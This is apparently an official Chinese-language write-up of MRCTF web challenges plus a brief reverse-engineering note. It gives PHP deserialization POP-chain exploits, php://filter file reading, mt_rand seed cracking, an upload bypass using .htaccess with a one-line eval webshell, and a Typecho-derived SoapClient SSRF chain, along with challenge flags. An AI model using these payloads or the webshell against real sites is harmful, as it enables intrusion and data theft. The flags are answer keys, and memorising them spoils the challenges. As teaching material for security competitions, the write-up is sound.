<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkXFF</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strpos($ip, <span class="string">"127.0.0.1"</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>顺便一提，如何验证用户的真实IP呢？确实不好办。因为用户可能使用代理（称为正向代理），我们的服务器因为业务需求，也会进行负载均衡等转发操作（称为反向代理）。但如果这个过程没有经过代理，一般使用Remote_Addr是可以获得真实IP的。<br>flag:<code>MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!}</code></p>
<h3 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h3><p>很简单的bypass<br>第一步md5好多种绕过方法。<br>可以当数组，可以当md5碰撞，可以构造0e开头科学计数法。<br>第二步用语句绕过<br>1234567|1=1<br>即可得到flag<br>比较简单</p>
<h3 id="EzPop"><a href="#EzPop" class="headerlink" title="EzPop"></a>EzPop</h3><p>主要考察对php魔术化方法的了解</p>
<p>提示里有参考资料，也是为了锻炼赛场上的自学能力吧</p>
<p>考点就这三个</p>
<h4 id="反序列化魔术方法"><a href="#反序列化魔术方法" class="headerlink" title="反序列化魔术方法"></a>反序列化魔术方法</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()<span class="comment">//当一个对象创建时被调用</span></span><br><span class="line">__destruct() <span class="comment">//当一个对象销毁时被调用</span></span><br><span class="line">__toString() <span class="comment">//当一个对象被当作一个字符串使用</span></span><br><span class="line">__sleep()<span class="comment">//在对象在被序列化之前运行</span></span><br><span class="line">__wakeup()<span class="comment">//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span></span><br><span class="line">__get()<span class="comment">//获得一个类的成员变量时调用</span></span><br><span class="line">__set()<span class="comment">//设置一个类的成员变量时调用</span></span><br><span class="line">__invoke()<span class="comment">//调用函数的方式调用一个对象时的回应方法</span></span><br><span class="line">__call()<span class="comment">//当调用一个对象中的不能用的方法的时候就会执行这个函数</span></span><br></pre></td></tr></table></figure>

<h4 id="public、protected与private在序列化时的区别"><a href="#public、protected与private在序列化时的区别" class="headerlink" title="public、protected与private在序列化时的区别"></a>public、protected与private在序列化时的区别</h4><p>protected 声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0<em>\0的前缀。这里的 \0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。这也许解释了，为什么如果直接在网址上，传递\0</em>\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p>
<h4 id="BASE64-Wrapper-LFI"><a href="#BASE64-Wrapper-LFI" class="headerlink" title="BASE64 Wrapper LFI"></a>BASE64 Wrapper LFI</h4><p><code>php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>Exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $source;</span><br><span class="line">	<span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $var;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;var=<span class="string">"php://filter/convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$r = <span class="keyword">new</span> Modifier();</span><br><span class="line">$t-&gt;p = $r;</span><br><span class="line">$s-&gt;str = $t;</span><br><span class="line">$s-&gt;source = $s;</span><br><span class="line">var_dump(urlencode(serialize($s)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);<span class="comment">//8.触发这个include，利用php base64 wrapper 读flag</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);<span class="comment">//7.然后会调用到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;<span class="comment">//4.这里会调用str-&gt;source的__get 那么我们将其设置为Test对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;<span class="comment">//2.如果pop是个Show,那么调用这里</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;<span class="comment">//3.匹配的时候会调用__toString</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;<span class="comment">//5.触发到这里</span></span><br><span class="line">        <span class="keyword">return</span> $function();<span class="comment">//6.()会调用__invoke,我们这里选择Modifier对象</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);<span class="comment">//1.反序列调用这里</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构造即可</p>
<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h3><p>在URL中GET请求当输入<code>.</code>或者<code></code>(空格)或者<code>_</code>都会忽略，因此<code>b_u_p_t</code>,其实就是<code>b u p t</code>,正则的意思是必须要23333开头和结尾，但是值不能为23333，这个时候url的%0A为换行污染，可以绕过正则，且值不为23333。直接进入下一个套娃。jsfuck在控制器输出发现POST Merak。Post Merak=1即可查看源码。判断意图是模拟本地用户，这里我禁了XFF头，可以用Client-ip进行绕过即可，最后<code>file_get_contents</code>需要解密，exp如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_code</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">    $result = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($value);$i++)&#123;</span><br><span class="line">        $result .= chr(ord($value[$i]) - $i*<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $result = base64_encode($result);</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> en_code(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>index页面是一个啥也没用的页面，需要扫后台，发现存在login.php为空，考虑到可能是处理后端,前端则是<code>login.html</code>,发现是一个简单的登录框，只有登录框想到大概率存在源码泄露，发现<code>www.zip</code>文件，判断登录逻辑是sql查询，没有任何过滤，可以直接万能密码，还需要输入密钥，这里产生公钥和秘钥的机制都是使用mt_rand，而这是个伪随机数，可以进行破解，知道公钥后将公钥转化成<code>php_mt_seed</code>格式，<code>gayhub</code>直接git clone，得到种子后，再将其生成12位密钥即可，具体原理:<a href="https://blog.csdn.net/crisprx/article/details/104306971">https://blog.csdn.net/crisprx/article/details/104306971</a><br>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = <span class="string">"KVQP0LdJKRaV3n9D"</span>;</span><br><span class="line">$randStr = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">   <span class="comment">//整理成方便 php_mt_seed 测试的格式</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *爆破得到mt_srand = 1775196155</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">  $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">  $public_key = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">  $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 先生成一次公钥在生成一次密钥  XuNhoueCDCGc</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">  $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">  $private_key = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">  $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>很经典的上传绕过，主要考察一下基本的上传绕过技能</p>
<p>利用BurpSuite修改MIME欺骗后端文件类型<br>修改<br>Content-Type: image/png<br>然后就可以传任意文件后缀<br>利用.htaccess来制作图片马</p>
<p>增加使用php解析的文件后缀(.jpg)</p>
<p>  AddType application/x-httpd-php .jpg</p>
<p>然后再写个一句话</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_REQUEST[&#39;eki&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>用蚁剑连上就可以了</p>
<h3 id="Ezpop-Revenge"><a href="#Ezpop-Revenge" class="headerlink" title="Ezpop Revenge"></a>Ezpop Revenge</h3><p>主要考察CMS审计能力和SSRF的应用<br>顺着Typecho的源码搞的<br>从Github上克隆源码，发现1.2预览版还有1.1的POP链<br>改造了一下入口,然后套了SoapClient来SSRF</p>
<p>入口点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//HelloWorld/Plugin.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">				unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">			&#125;</span><br><span class="line">            <span class="comment">//call_user_func("call_user_func",array($a,"233"));</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>路由点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Typecho/Plugin.php       </span></span><br><span class="line">       Helper::addRoute(<span class="string">"page_admin_action"</span>,<span class="string">"/page_admin"</span>,<span class="string">"HelloWorld_Plugin"</span>,<span class="string">'action'</span>);</span><br></pre></td></tr></table></figure>

<p>Pop链可以参照Exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($coincidence)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = $coincidence;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params;</span><br><span class="line">    <span class="keyword">private</span> $_filter;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params,$filter)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params=$params;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter=$filter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_type = <span class="string">'ATOM 1.0'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_charset = <span class="string">'UTF-8'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_lang = <span class="string">'zh'</span>;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$target = <span class="string">"http://127.0.0.1/flag.php"</span>;</span><br><span class="line">$post_string = <span class="string">''</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,</span><br><span class="line">                                <span class="string">'user_agent'</span>=&gt;<span class="string">"eki\r\nContent-Type: application/x-www-form-urlencoded\r\n"</span>.join(<span class="string">"\r\n"</span>,$headers).<span class="string">"\r\nContent-Length: "</span>.(string)strlen($post_string).<span class="string">"\r\n\r\n"</span>.$post_string,</span><br><span class="line">                                <span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line"></span><br><span class="line">$payload1 = <span class="keyword">new</span> Typecho_Request(<span class="keyword">array</span>(<span class="string">'screenName'</span>=&gt;<span class="keyword">array</span>($a,<span class="string">"233"</span>)),<span class="keyword">array</span>(<span class="string">'call_user_func'</span>));</span><br><span class="line">$payload2 = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">$payload2-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $payload1));</span><br><span class="line">$exp1 = <span class="keyword">array</span>(<span class="string">'hello'</span> =&gt; $payload2, <span class="string">'world'</span> =&gt; <span class="string">'typecho'</span>);</span><br><span class="line">$exp = <span class="keyword">new</span> HelloWorld_DB($exp1);</span><br><span class="line"><span class="keyword">echo</span> serialize($exp).<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize($exp)));</span><br></pre></td></tr></table></figure>

<p>可以分析内网地址</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]===<span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">   $_SESSION[<span class="string">'flag'</span>]= <span class="string">"MRCTF&#123;Cr4zy_P0p_4nd_RCE&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"我扌your problem?\nonly localhost can get flag!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这也是为啥cookie要带session</p>
<p>用payload打一次刷新下页面var_dump()就会dumpflag出来了</p>
<h3 id="Not-So-Web-Application"><a href="#Not-So-Web-Application" class="headerlink" title="Not So Web Application"></a>Not So Web Application</h3><p>首先是题目说明，这玩意本来没这么恶心（没伪装加上 User 和 SQL 那个 SVG）<br>本题主要难点在于 Web Assembly 至今没有个能用的调试器，所以需要多种手段动调+静态调试。<br>可以先通过和其他 Qt for Web Assembly 程序比对，去掉一大半疑似函数，同时可以通过搜索字符串（Incorrect等）确定大概相关函数位置。<br>同时通过给输入框塞入大量垃圾（&gt;64KB，wasm基本内存单位）触发内存越界错误找到变量存储位置。最终在浏览器里动调和 wasm2c 的辅助可以找到flag加密后内容和比对算法。</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="Xor-校内专供"><a href="#Xor-校内专供" class="headerlink" title="Xor(校内专供)"></a>Xor(校内专供)</h3><p>异或一次后的数据再异或一次即可得到原数据<br>将输入字符和序号进行异或，再与目标数组比较<br>所以只需要将目标数组反过来再次异或就可以得到flag</p>
